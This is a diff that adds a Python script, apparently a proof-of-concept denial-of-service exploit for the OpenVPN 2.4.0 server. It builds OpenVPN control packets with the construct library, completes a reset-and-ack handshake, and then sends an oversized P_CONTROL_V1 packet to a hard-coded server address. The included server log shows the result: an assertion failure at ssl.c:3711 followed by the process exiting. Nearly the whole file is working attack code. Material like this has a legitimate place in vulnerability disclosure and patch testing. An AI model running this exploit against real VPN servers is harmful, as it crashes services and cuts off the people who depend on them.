@@ -1,0 +1,100 @@
+#!/usr/bin/env python3
+'''
+$ ./dos_server.py &
+$ sudo ./openvpn-2.4.0/src/openvpn/openvpn conf/server-tls.conf
+...
+Fri Feb 24 10:19:19 2017 192.168.149.1:64249 TLS: Initial packet from [AF_INET]192.168.149.1:64249, sid=9a6c48a6 1467f5e1
+Fri Feb 24 10:19:19 2017 192.168.149.1:64249 Assertion failed at ssl.c:3711 (buf_copy(in, buf))
+Fri Feb 24 10:19:19 2017 192.168.149.1:64249 Exiting due to fatal error
+Fri Feb 24 10:19:19 2017 192.168.149.1:64249 /sbin/route del -net 10.8.0.0 netmask 255.255.255.0
+Fri Feb 24 10:19:19 2017 192.168.149.1:64249 Closing TUN/TAP interface Fri Feb 24 10:19:19 2017 192.168.149.1:64249 /sbin/ifconfig tun0 0.0.0.0
+'''
+
+import binascii
+import os
+import socket
+from construct import *
+HOST, PORT = "192.168.0.1", 1194
+
+SessionID = Bytes(8)
+
+PControlV1 = Struct(
+    "packet_id" / Int32ub,
+    "data" / GreedyBytes
+)
+
+PAckV1 = Struct(
+    "remote_session_id" / SessionID
+)
+
+PControlHardResetClientV2 = Struct(
+    "packet_id" / Int32ub
+)
+
+PControlHardResetServerV2 = Struct(
+    "remote_session_id" / SessionID,
+    "packet_id" / Int32ub
+)
+
+OpenVPNPacket = Struct(
+    EmbeddedBitStruct(
+        "opcode" / Enum(BitsInteger(5),
+                        P_CONTROL_HARD_RESET_CLIENT_V1=1,
+                        P_CONTROL_HARD_RESET_SERVER_V1=2,
+                        P_CONTROL_HARD_RESET_CLIENT_V2=7,
+                        P_CONTROL_HARD_RESET_SERVER_V2=8,
+                        P_CONTROL_SOFT_RESET_V1=3,
+                        P_CONTROL_V1=4,
+                        P_ACK_V1=5,
+                        P_DATA_V1=6),
+        "key_id" / BitsInteger(3)
+    ),
+    "session_id" / SessionID,
+    "ack_packets" / PrefixedArray(Int8ub, Int32ub),
+    Embedded(Switch(this.opcode,
+            {
+                "P_CONTROL_V1": PControlV1,
+                "P_ACK_V1": PAckV1,
+                "P_CONTROL_HARD_RESET_CLIENT_V2": PControlHardResetClientV2,
+                "P_CONTROL_HARD_RESET_SERVER_V2": PControlHardResetServerV2
+            }))
+)
+def main():
+    session_id = os.urandom(8)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    reset_client = OpenVPNPacket.build({
+        "opcode": "P_CONTROL_HARD_RESET_CLIENT_V2",
+        "key_id": 0,
+        "session_id": session_id,
+        "ack_packets": [],
+        "packet_id": 0})
+
+    sock.sendto(reset_client, (HOST, PORT))
+
+    data, addr = sock.recvfrom(8192)
+    reset_server = OpenVPNPacket.parse(data)
+
+    remote_session_id = reset_server.session_id
+
+    # ack server packet
+    ack_packet = OpenVPNPacket.build({
+        "opcode": "P_ACK_V1",
+        "key_id": 0,
+        "session_id": session_id,
+        "ack_packets": [reset_server.packet_id],
+        "remote_session_id": remote_session_id
+    })
+    sock.sendto(ack_packet, (HOST, PORT))
+
+    control_packet = OpenVPNPacket.build({
+        "opcode": "P_CONTROL_V1",
+        "key_id": 0,
+        "session_id": session_id,
+        "ack_packets": [],
+        "packet_id": 1,
+        "data": b"a" * 2048})
+    sock.sendto(control_packet, (HOST, PORT))
+
+if __name__ == '__main__':
+    main()
